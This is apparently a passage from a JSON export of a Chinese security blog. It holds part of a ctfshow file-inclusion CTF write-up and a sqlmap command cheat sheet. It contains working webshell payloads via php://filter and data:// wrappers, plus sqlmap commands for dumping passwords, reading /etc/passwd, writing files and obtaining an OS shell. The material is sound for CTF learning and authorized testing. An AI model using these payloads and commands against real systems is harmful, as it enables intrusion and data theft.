流的 base64-decode 方法\n\n思路:\n\nBase64 编码仅包含 64 个可打印字符，即 A-Z、a-z、0-9、+ 和 /。在 PHP 中，当使用 base64_decode 函数解码一个字符串时，如果字符串中包含不在 Base64 字符集中的字符，这些字符将被跳过，只解码合法的 Base64 字符。\n\n所以当题目中 $content 被加上了 `<?php die('大佬别秀了');?> `，我们可以使用 php://filter/write=convert.base64-decode 先对其进行解码，在解码过程中，字符 <、?、空格、(、'、)、;、>，这些字符不符合 base64 编码的字符范围都将先被移除，最终剩下的用于解码的字符只有 phpdie 和我们 post 传入的内容。由于 Base64 解码是以 4 个字符为一组进行的，这里移除后只剩下 6 个字符，因此我们随便加两个合法字符补全，让其 base64 解码成功，后面再继续传入经过 base64 编码的 payload，也可以被正常解码。\n\n了解完原理就开始做题吧。\n\n由于这里 url 传入的内容本身会进行一次 url 解码，题目中还使用了一个 urldecode 函数，因此 file 传入的内容需要先经过两次 url 编码再传入。\n\ncontent是写入内容,要进行base64编码 对应上面的伪协议解码,而base解码时,是4个一组,flag.php(要写入的文件),写入的内容中只有phpdie会参与base64解码,因为phpdie只有6个字节,补两个a就是8字节了）（aaPD9waHAgc3lzdGVtKCdscycpOz8+）11是补给前面的 （结果就是phpdie11PD9waHAgQGV2YWwoJF9HRVRbJ2NtZCddKTs/Pg==（四个一组）） }else{     highlight_file(**FILE**); }\n\nfile 传入 php://filter/write=convert.base64-decode/resource=shell.php\n\n进行二次编码后得到:\n\n```python\n?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%37%30%25%36%38%25%37%30\n```\n\n对 webshell 进行 base64 编码：\n\nwebshell：`<?php @eval($_GET['cmd']);?>`\n\n编码后得到:\nPD9waHAgQGV2YWwoJF9HRVRbJ2NtZCddKTs/Pg==\n\n注意我们还需要加两个合法字符让前面 base64 解码成功，这里多传入两个1。\n\npost 传入：\n\n```php\ncontent=11PD9waHAgQGV2YWwoJF9HRVRbJ2NtZCddKTs/Pg==\n```\n\n用hackbar传参\n\n![img](./../image/achieve/202411/文件包含--ctfshow/1730392984123-c15ea09a-64a0-487a-90d6-0e1a026c17fd.png)\n\n然后调用shell.php，传入cmd\n\n![img](./../image/achieve/202411/文件包含--ctfshow/1730393020737-c16d92aa-9fb3-4d03-9965-50bc47f3cf8a.png)\n\n最后拿flag就行了\n\n### 通过 rot13 编码实现绕过\n\n\\<?php die('大佬别秀了');?> 经过 rot13 编码会变成 \\<?cuc qrv(); ?>，如果 php 未开启短标签，则不会认识这段代码，也就不会执行。\n\nfile 传入 php://filter/write=string.rot13/resource=sh.php\n\nfile 传入 php://filter/write=string.rot13/resource=sh.php\n\n两次 url 编码：\n\n```python\n?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%32%25%36%66%25%37%34%25%33%31%25%33%33%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%37%33%25%36%38%25%32%65%25%37%30%25%36%38%25%37%30\n```\n\n将一句话木马进行 rot13 解码后传入 \n\ncontent=\\<?cuc @riny($_TRG['pzq']);?>\n\n方法是一样的，主要是编码方式不一样，最终还是依靠编码去使die()函数exit掉\n\n**但这道题主要是前面短标签的 php 代码 \\<?cuc qvr('大佬别秀了');?> 无法被识别，但是后面的 `<?php @eval($_GET['cmd']);?> `可以正常执行，总的来说这种方法适用于未开启短标签的情况。**\n\n### 通过 strip_tags 函数去除 [XML](https://so.csdn.net/so/search?q=XML&spm=1001.2101.3001.7020) 标签\n\n\\<?php die(); ?> 实际上就是一个 XML 标签，我们可以通过 strip_tags 函数去除它。\n\n#### strip_tags函数\n\n是一个在PHP中非常有用的内置函数，其主要功能是去除字符串中的HTML和PHP标签，确保输出到浏览器的内容是安全的\n\nstrip_tags()函数用于剥去字符串中的HTML、XML以及PHP的标签。它接受一个字符串作为输入，并返回该字符串的一个版本，其中所有的HTML和PHP标签（除非在可选参数中指定了允许保留的标签）都被移除。\n\n具体用法:\n\nstrip_tags(string $str [, string $allowable_tags = null ]): string\n\n但是我们传入的一句话木马也是 XML 标签，如何让它只去除 \\<?php die(); ?> 而不破坏我们传入的木马呢？我们可以先对一句话木马进行 base64 编码后传入，这样就不会受到 strip_tags 函数的影响，当去除掉 \\<?php die(); ?> 后，由于 php://filter 允许使用多个过滤器，我们再调用 base64-decode 将一句话木马进行 base64 解码，实现还原。\n\n这个做法没试过，你们可以试一下\n\n## web88\n\n很经典的一道文件包含题哈\n\n![img](./../image/achieve/202411/文件包含--ctfshow/1730394008762-1f4d5086-c564-4870-bd5c-4a07dfd049ad.png)\n\n这里过滤了php,~,!,@,#,$,%,^,&,*,(,),-,+,=,.键盘顶上的符号全部被过滤了\n\n然后我用了日志注入，php://filter伪协议和php://input伪协议发现都不能很好的绕过这些验证，这时候我们先找找哪些字符是可用的，从这些字符里面寻找做题思路\n\n![img](./../image/achieve/202411/文件包含--ctfshow/1730394986525-f1c33433-17cf-46fd-b824-e04ae1a7c1ed.png)\n\n利用data伪协议，同时进行base64加密，由于过滤了=，所以可以在构造的 命令中添加上空格\n\n```plain\n?file=data://text/plain;base64,PD9waHAgICAgIHN5c3RlbSgndGFjIGZsMGcucGhwJyk7\n```\n\n主要是data协议构造base64的时候必须要求不含=和+号，多试几次构造一下，在结尾?>后添加字符消除=\n","tags":["文件包含"],"categories":["ctfshow"]},{"title":"sqlmap基础命令的摘录","url":"/2024/12/02/sqlmap基础命令的摘录/","content":"\n# 0x01前言\n\n之前看到一个师傅的文章写了很多sqlmap的指令，然后觉得挺全面的想收集一下，所以发个文章去做记录，但是后面找不到借鉴的师傅的文章了，后面找到了这里再放引用\n\n# 0x02正文\n\n## 关于sqlmap\n\nsqlmap 是一款开源的自动化 SQL 注入测试及漏洞利用工具\n\nsqlmap它支持5种SQL注入技术：\n\n- 布尔盲注，页面无回显时，利用返回页面判断来判断查询语句正确与否\n- 时间盲注，页面无回显时，利用时间延迟语句是否已经执行来判断查询语句正确与否\n- 报错注入，即利用报错信息进行注入\n- 联合注入，即Union联合注入\n- 堆叠注入，即在允许同时执行多条语句时，利用逗号同时执行多条语句的注入\n\n### 1.基础命令\n\n```plain\n-u  \"url\"\t\t#检测注入点\n--dbs\t\t\t#列出所有数据库的名称\n--current-db\t        #列出当前数据库的名称\n-D\t\t\t#指定一个数据库\n--table\t\t\t#列出所有表名\n-T\t\t\t#指定表名\n--columns\t\t#列出所有字段名\n-C\t\t\t#指定字段\n-dump\t\t\t#列出字段内容\n```\n\n#### GET注入指定 url 作为目标输入\n\n```python\npython sqlmap.py -u \"url\"\n```\n\n#### POST注入将请求包保存为request.txt进行注入\n\n```python\nsqlmap -r request.txt -p id --dump\nor\nsqlmap -r request.txt --data='id=1' --dump\n```\n\n#### –sql-shell:运行自定义SQL语句\n\n#### –os-cmd, –os-shell:运行任意操作系统命令\n\n当为MySQL数据库时，需满足下面条件：\n\n- 当前用户为 root\n- 知道网站根目录的绝对路径\n\n```python\nsqlmap -u \"url\"  --refer=ctf.show --os-shell \n```\n\n#### –file-read:从数据库服务器中读取文件\n\n```python\nsqlmap -u \"url\" --file-read \"c:/test.txt\"\n```\n\nsqlmap还有有探测等级和危险等级(—level —risk)的设置：\nsqlmap一共有5个探测等级，默认是1。等级越高，说明探测时使用的payload也越多。其中5级的payload最多，会自动破解出cookie、XFF等头部注入。当然，等级越高，探测的时间也越慢。这个参数会影响测试的注入点，GET和POST的数据都会进行测试，HTTP cookie在level为2时就会测试，HTTP User-Agent/Referer头在level为3时就会测试。在不确定哪个参数为注入点时，为了保证准确性，建议设置level为5。\n\nsqlmap一共有3个危险等级，也就是说你认为这个网站存在几级的危险等级。和探测等级一个意思，在不确定的情况下，建议设置为3级\n\n比如：\n\n```plain\nsqlmap -u \"url\" --level=5 --risk=3\n```\n\n### 2. 关于tamper\n\n使用 `python sqlmap.py --list-tampers` 可以查看每一个 tamper 的具体作用以及它们所支持的数据库类型\n\n使用 `python sqlmap.py --tamper=<tamper-name>` 可以指定注入时使用的 tamper，多个 tamper 可通过逗号分隔。\n\n##### 1、apostrophemask.py \n\n适用数据库：ALL\n\n 作用：将引号替换为utf-8，用于过滤单引号 \n\n使用脚本前：tamper(\"1 AND '1'='1\") \n\n使用脚本后：1 AND %EF%BC%871%EF%BC%87=%EF%BC%871\n\n\n\n##### 2、base64encode.py \n\n适用数据库：ALL \n\n作用：替换base64编码 \n\n使用脚本前：tamper(\"1' AND SLEEP(5)#\") \n\n使用脚本后：MScgQU5EIFNMRUVQKDUpIw== \n\n\n\n##### 3、multiplespaces.py\n\n 适用数据库：ALL \n\n作用：围绕sql关键字添加多个空格 \n\n使用脚本前：tamper('1 UNION SELECT foobar') \n\n使用脚本后：1 UNION SELECT foobar \n\n\n\n##### 4、space2plus.py \n\n适用数据库：ALL \n\n作用:用加号替换空格 \n\n使用脚本前：tamper('SELECT id FROM users') \n\n使用脚本后：SELECT+id+FROM+users \n\n\n\n##### 5、space2randomblank.py \n\n适用数据库：ALL \n\n作用：将空格替换为其他随机有效字符 \n\n使用脚本前：tamper('SELECT id FROM users') \n\n使用脚本后：SELECT%0Did%0CFROM%0Ausers\n\n\n##### 6、unionalltounion.py \n\n适用数据库：ALL \n\n作用：将union all select 替换为union select \n\n使用脚本前：tamper('-1 UNION ALL SELECT')\n\n 使用脚本后：-1 UNION SELECT \n\n\n\n##### 7、space2dash.py \n\n适用数据库：ALL \n\n作用：将空格替换为破折号（--），并添加一个随机字符和换行符（\\n） \n\n使用脚本前：tamper('1 AND 9227=9227') \n\n适用脚本后：1--upgPydUzKpMX%0AAND--RcDKhIr%0A9227=9227\n\n\n\n#####  8、space2mssqlblank.py\n\n 适用数据库：mssql \n\n测试数据库版本：Microsoft SQL Server 2000 、Microsoft SQL Server 2005\n\n 作用：将空格替换为有效字符集的随机空白字符('%01', '%02', '%03', '%04', '%05', '%06', '%07', '%08', '%09', '%0B', '%0C', '%0D', '%0E', '%0F', '%0A') \n\n使用脚本前：tamper('SELECT id FROM users') \n\n适用脚本后：SELECT%0Did%0DFROM%04users \n\n\n\n##### 9、between.py \n\n测试数据库：Microsoft SQL Server 2005 、MySQL 4, 5.0 and 5.5、 Oracle 10g、 PostgreSQL 8.3, 8.4, 9.0 \n\n作用：将\">\"替换为\"NOT BETWEEN 0 AND #\"，将\"=\"替换为\"BETWEEN # AND #\" \n\n使用脚本前：tamper('1 AND A > B--')，tamper('1 AND A = B--') \n\n使用脚本后：1 AND A NOT BETWEEN 0 AND B--，1 AND A BETWEEN B AND B--\n\n\n\n##### 10、percentage.py\n\n 适用数据库：ASP \n\n测试数据库：Microsoft SQL Server 2000, 2005 、MySQL 5.1.56, 5.5.11 、PostgreSQL 9.0 \n\n作用：在每个字符前加上一个% \n\n使用脚本前：tamper('SELECT FIELD FROM TABLE') \n\n使用脚本后：%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E \n\n\n\n\n\n##### 11、sp_password.py \n\n适用数据库：mssql \n\n作用：将sp_password追加到有效载荷后，以便从DBMS日志中自动混淆。 \n\n使用脚本前：tamper('1 AND 9227=9227-- ') \n\n使用脚本后：1 AND 9227=9227-- sp_password\n\n\n\n#####  12、charencode.py \n\n测试数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0 \n\n作用：对指定的payload全部使用url编码（不处理已进行编码的字符） \n\n使用脚本前：tamper('SELECT FIELD FROM%20TABLE') \n\n使用脚本后：%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45 \n\n\n\n##### 13、randomcase.py \n\n测试数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0、SQLite 3 作用：将字符替换为随机大小写 \n\n使用脚本前：tamper('INSERT') \n\n使用脚本后：InSeRt \n\n\n\n##### 14、charunicodeencode.py \n\n适用数据库：ASP 、ASP.NET 测试数据库：Microsoft SQL Server 2000 、Microsoft SQL Server 2005、MySQL 5.1.56 、PostgreSQL 9.0.3 \n\n作用：适用字符串的Unicode编码\n\n 使用脚本前：tamper('SELECT FIELD%20FROM TABLE') \n\n使用脚本后：%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045\n\n\n\n#####  15、space2comment.py \n\n测试数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0\n\n 作用：将空格替换为/**/ \n\n使用脚本前：tamper('SELECT id FROM users') \n\n使用脚本后：SELECT/**/id/**/FROM/**/users\n\n#### 使用 sqlmap 自带爬虫爬取目标页面\n\n```bash\n$ python sqlmap.py -u \"http://baidu.com/\" --crawl=1\n```\n\n1. 使用 sqlmap 自带的表单解析功能获取目标表单\n\n```bash\n$ python sqlmap.py -u \"http://baidu.com/\" --forms\n```\n\n1. 使用 sqlmap 扫描配置文件作为目标\n\n```bash\n$ python sqlmap.py -c sqlmap-scan.ini\n```\n\n### 3.请求相关\n\n#### 1. 设置请求时的 UA\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" -A 'Test-Java-Agent'\n```\n\n#### 2. 设置请求时的 Header\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" -H 'X-Forwarded-For: 127.0.0.1'\n```\n\n#### 3. 设置请求时的方法（适用于 `-u`、`-m` 等无法将完整数据包传入的场景）\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\"  --method='POST'\n```\n\n#### 4. 设置请求时传递的数据（适用于 `-u`、`-m` 等无法将完整数据包传入的场景）\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/login\" --data='username=123&password=xxoo'\n```\n\n#### 5. 设置请求时默认的参数间隔符（默认是 `&`）\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1;qq=2\" --param-del=';'\n```\n\n#### 6. 设置请求时的 cookie\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --cookie='sessionid=xxxx'\n```\n\n#### 7. 设置请求时默认的 cookie 间隔符（默认是`;`）\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --cookie='sessionid=xxxx|username=admin' --cookie-del='|'\n```\n\n#### 8. 指定存放了存活 cookie 的文件（在每一次请求时都会访问此文件获取 cookie）\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --live-cookies='/tmp/live-cookies'\n```\n\n#### 9. 忽略 response 中的 set-cookie\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --drop-set-cookie\n```\n\n#### 10. 使用随机 UA\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --random-agent\n```\n\n#### 11. 指定请求时的 Host\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --host='127.0.0.1'\n```\n\n#### 12. 指定请求时的 Referer\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --referer='http://127.0.0.1/'\n```\n\n#### 13. 指定多个请求时的 Header\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --headers=\"Accept-Language: fr\\nETag: 123\"\n```\n\n#### 14. 指定请求时的 auth 方式（当请求存在 auth 时使用）\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --auth-type='Basic'\n```\n\n#### 15. 指定进行认证时使用的认证信息\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --auth-cred='admin:123456'\n```\n\n#### 16. 指定认证时使用的证书或私钥\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --auth-file='private-key'\n```\n\n#### 17. 忽略无效的 response status code\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --ignore-code=404\n```\n\n#### 18. 忽略系统代理\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --ignore-proxy\n```\n\n#### 19. 忽略 response 中的跳转（似乎存在问题）\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --ignore-redirects\n```\n\n#### 20. 忽略请求超时\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --ignore-timeouts\n```\n\n#### 21. 设置请求所使用的代理\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --proxy='http://127.0.0.1:8080'\n```\n\n#### 22. 设置请求所使用代理的账号密码\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --proxy='http://127.0.0.1:8080' --proxy-cred='admin:123456'\n```\n\n#### 23. 设置存放了代理的文本\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --proxy-file='/tmp/proxies'\n```\n\n#### 24. 设置每个请求之间的间隔时间（秒）\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --delay=5\n```\n\n#### 25. 设置请求超时时间\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --timeout=2\n```\n\n#### 26. 设置请求最大重试次数\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --retries=3\n```\n\n#### 27. 设置重试匹配正则（当页面内容匹配上时重新请求）\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --retry-on='</font>'\n```\n\n#### 28. 设置不对 payload 进行 urlencode\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --skip-urlencode\n```\n\n#### 29. 设置使用分块传输数据\n\n```bash\n$ python sqlmap.py -r req.txt --chunked\n```\n\n#### 30. 设置使用参数污染分离 payload\n\n（这里的 payload 有点奇怪，不是每个后端都能解析的，建议使用时通过 `-v 4` 自行观察 payload）\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" -hpp\n```\n\n#### 31. 设置请求线程数\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --threads=3\n```\n\n### 4.注入相关\n\n#### 1. 设置需要注入的参数\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" -p id\n```\n\n#### 2. 设置需要跳过注入的参数\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1&timestamp=1111\" --skip=timestamp\n```\n\n#### 3. 设置注入时跳过静态参数的测试\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --skip-static\n```\n\n#### 4. 设置需要跳过注入的参数（ 与`--skip` 的不同之处在于此处为正则匹配而非字符串相等的判断）\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1&sessionId=123\" --param-exclude='sess'\n```\n\n#### 5. 设置需要测试的数据库类型（当预先知道目标数据库时可使用此参数减少发包量）\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --dbms='mysql'\n```\n\n#### 6. 设置关闭 cast 函数的使用（某些 MYSQL 版本需要使用）\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --no-cast\n```\n\n#### 7. 设置关闭 char 函数的使用（减少 payload 长度）\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --no-escape\n```\n\n#### 8. 设置启用 hex 编码（避免因编码原因导致注入时的数据丢失）\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --hex\n```\n\n#### 9. 使用 tamper 修改 payload\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --tamper='uppercase'\n```\n\n#### 10. 设置注入请求级别（级别越高请求量越大）\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --level=3\n```\n\n#### 11. 设置注入威胁级别（级别越高风险越大，会使用一些带 OR 的测试语句）\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --risk=5\n```\n\n#### 12. 设置页面匹配的方式\n\n##### a. 设置匹配响应的字符串（当页面存在这个值时为真，用于布尔注入）\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --string='You are'\n```\n\n##### b. 设置匹配响应的正则（当页面被这个正则匹配到时为真，用于布尔注入）\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --regexp='You are [a-z]{1,5}'\n```\n\n##### c. 设置不匹配响应的字符串（当页面存在这个值时为假，用于布尔注入）\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --not-string='Failed'\n```\n\n#### 13. 设置使用状态码判断页面真假（当响应为此状态码时为真，优先级低于页面匹配）\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --code=200\n```\n\n#### 14. 设置仅当启发式注入返回真时才继续接下来的注入测试\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --smart\n```\n\n#### 15. 设置要使用的注入测试技术（BEUSTQ，每个字母代表一种注入方式，B 代表 Boolean、T 代表 Time）\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --technique=B\n```\n\n#### 16. 设置延迟注入默认的延迟时间\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --time-sec=2\n```\n\n#### 17. 设置二次注入的页面\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-new/first.php?referer=x\" --second-url \"http://localhost:8887/less-new/second.php\"\n```\n\n### 5.通用功能\n\n#### 1. 设置将所有 SQLMAP 发出的测试请求信息存储至文本中\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" -t sqlmap-request.log\n```\n\n#### 2. 设置 SQLMAP 的默认答案\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --answers=\"quit=N,follow=N\"\n```\n\n#### 3. 设置后续不再询问用户输入而是直接使用默认选项\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --batch\n```\n\n#### 4. 设置在进行注入测试前先检查自身网络环境\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --check-internet\n```\n\n#### 5. 设置爬虫模式下不爬取某些链接（比如不爬取退出链接）\n\n```bash\n$ python sqlmap.py -u \"http://baidu.com/\" --crawl=1 --crawl-exclude='logout'\n```\n\n#### 6. 设置输出格式（CSV、HTML、SQLITE）\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --dump-format='CSV'\n```\n\n#### 7. 设置将所有 SQLMAP 发出的测试请求信息存储至 HAR 文件中\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --har=sqlmap-request.har\n```\n\n#### 8. 设置默认的输出路径\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --output-dir='/tmp'\n```\n\n#### 9. 设置跳过启发性注入测试\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --skip-heuristics\n```\n\n#### 10. 设置跳过 WAF 探测\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --skip-waf\n```\n\n#### 11. 设置 target web 的绝对路径\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --web-root='/var/www/html'\n```\n\n#### 12. 将本次扫描的配置存储到文件中（后续可直接加载此文件进行注入测试）\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --save='sqlmap-scan.ini'\n```\n\n### 6. 注入利用\n\n#### 1. 读取目标数据库具体版本\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --banner\n```\n\n#### 2. 读取当前用户以及当前数据库\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --current-db --current-user\n```\n\n#### 3. 读取所有数据库\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --dbs\n```\n\n#### 4. 读取某个数据库的所有表\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" -D db_name --tables\n```\n\n#### 5. 读取某个表的所有列\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" -D db_name -T table_name --columns\n```\n\n#### 6. 读取某个列的所有数据\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" -D db_name -T table_name -C col_name --dump\n```\n\n#### 7. 读取某个表的数据量\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" -D db_name -T table_name --count\n```\n\n#### 8. 读取数据库的所有用户\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --users\n```\n\n#### 9. 读取数据库内所有用户的密码信息\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --passwords\n```\n\n#### 10. 读取目标主机名\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --hostname\n```\n\n#### 11. 搜寻数据库、表、列\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --search -T user\n```\n\n#### 12. 读取目标系统中的文件\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --file-read='/etc/passwd'\n```\n\n#### 13. 写入文件到目标系统中\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --file-write \"/tmp/local-file.php\" --file-dest \"/var/www/html/remote-file.php\"\n```\n\n#### 14. UDF提权\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --udf-inject --shared-lib='/tmp/xxx.dll'\n```\n\n#### 15. 执行系统命令\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --os-cmd='id'\n```\n\n#### 16. 获取目标 shell\n\n1. 获取系统 shell\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --os-shell\n```\n\n#### 17. 获取 sql shell\n\n```bash\n$ python sqlmap.py -u \"http://127.0.0.1:8887/Less-1/Less-1?id=1\" --sql-shell\n```\n\n#### 18. 操作 Windows 注册表\n\n```bash\n--reg-read          设置后续将读取 windows 注册表\n--reg-add           添加 key:value 到 windows 注册表\n--reg-del           删除 key:value 到 windows 注册表\n--reg-key=REGKEY    指定要操作的 windows 注册表 key\n--reg-value=REGVAL  指定要操作的 windows 注册表 value\n--reg-data=REGDATA  设置 value 对应的 data\n--reg-type=REGTYPE  设置 data 对应的 type（如DWORD）\n```\n","tags":["sqlmap基础命令"],"categories":["sqlmap"]},{"title":"玄机第四章windows实战","url":"/2024/12/02/玄机第四章windows实战/","content":"\n# 